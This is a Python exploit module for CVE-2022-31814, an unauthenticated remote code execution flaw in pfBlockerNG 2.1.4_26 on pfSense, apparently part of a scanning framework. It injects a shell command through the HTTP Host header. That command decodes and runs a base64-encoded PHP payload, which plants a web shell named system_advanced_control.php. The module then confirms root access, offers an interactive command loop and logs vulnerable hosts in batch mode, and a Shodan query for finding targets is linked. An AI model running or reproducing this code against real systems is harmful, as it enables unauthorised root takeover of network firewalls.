#!/user/bin/env python3
# -*- coding: utf-8 -*-
"""
Reworked and optimized exploit script of pfBlockerNG 2.1.4_26 vulnerability

Exploit Title: pfBlockerNG 2.1.4_26 - Remote Code Execution (RCE)
Shodan Results:
https://www.shodan.io/search?query=http.title%3A%22pfSense+-+Login%22+%22Server%3A+nginx%22+%22Set-Cookie%3A+PHPSESSID%3D%22
Date: 5th of September 2022
Exploit Author: IHTeam
Vendor Homepage: https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html
Software Link: https://github.com/pfsense/FreeBSD-ports/pull/1169
Version: 2.1.4_26
Tested on: pfSense 2.6.0
CVE : CVE-2022-31814
Original Advisory: https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
"""
import time
import urllib.parse
import requests, urllib3
from pub.com.outprint import OutPrintInfo, OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile

urllib3.disable_warnings()


class Cve_2022_31814:
    def check_endpoint(self, url):
        try:
            response = requests.get(f"{url}/pfblockerng/www/index.php", verify=self.ssl, proxies=self.proxy,
                                    headers=self.headers)
            if response.status_code == 200:
                if not self.batch:
                    OutPrintInfoSuc("PfSense", f'pfBlockerNG is installed')
                return True
            else:
                if not self.batch:
                    OutPrintInfo("PfSense", f"pfBlockerNG isn't installed")

                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("PfSense", f'目标请求出错')
            return False

    def upload_shell(self, url, shell_filename):
        try:
            payload = {
                "Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3 -m base64 -d | php; '"
            }
            if not self.batch:
                OutPrintInfo("PfSense", f"Uploading shell...")
            response = requests.get('%s/pfblockerng/www/index.php' % (url), headers=payload, verify=self.ssl,
                                    proxies=self.proxy)
            time.sleep(2)
            response = requests.get('%s/system_advanced_control.php?c=id' % (url), verify=self.ssl, proxies=self.proxy,
                                    headers=self.headers)
            if "uid=0(root) gid=0(wheel)" in str(response.content, "utf-8"):
                if not self.batch:
                    OutPrintInfoSuc("PfSense", f'Upload succeeded')
                else:
                    OutPrintInfoSuc("PfSense", f"目标存在漏洞:{url}/{shell_filename}?c=id")
                    OutPutFile("pfsense_pfblocker_rce.txt", f"目标存在漏洞:{url}/{shell_filename}?c=id")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("PfSense", f'Error uploading shell. Probably patched')

                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("PfSense", f'目标请求出错')
            return False


    def interactive_shell(self, url, shell_filename, cmd):
        try:
            response = requests.get('%s/system_advanced_control.php?c=%s' % (url, urllib.parse.quote(cmd, safe='')),
                                    verify=self.ssl, proxies=self.proxy, headers=self.headers)
            if not self.batch:
                OutPrintInfo("PfSense", f'响应:\n{str(response.text).strip()}')
        except Exception:
            if not self.batch:
                OutPrintInfo("PfSense", f'目标请求出错')
            return False

    def delete_shell(self, url, shell_filename):
        try:
            delcmd = "rm /usr/local/www/" + shell_filename
            response = requests.get('%s/system_advanced_control.php?c=%s' % (url, urllib.parse.quote(delcmd, safe='')), verify=self.ssl,
                                    proxies=self.proxy, headers=self.headers)
            if not self.batch:
                OutPrintInfo("PfSense", 'Shell deleted')
        except Exception:
            if not self.batch:
                OutPrintInfo("PfSense", f'目标请求出错')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("PfSense", '开始检测PfSense pfBlockerNG 未授权RCE漏洞...')

        shell_filename = "system_advanced_control.php"

        if self.check_endpoint(url):
            if self.upload_shell(url, shell_filename):
                if not self.batch:
                    choose = Prompt.ask("[b yellow]是否进行漏洞利用([b red]y/n[/b red])")
                    if choose == "y":
                        try:
                            while True:
                                cmd = Prompt.ask("[b yellow]输入需要执行到命令")
                                if cmd == "exit":
                                    break
                                self.interactive_shell(url, shell_filename, cmd)
                        except:
                            self.delete_shell(url, shell_filename)
            else:
                if not self.batch:
                    OutPrintInfo("PfSense", '[b yellow]漏洞文件未上传成功')
                return
        else:
            return


        if not self.batch:
            OutPrintInfo("PfSense", 'PfSense pfBlockerNG 漏洞检测结束')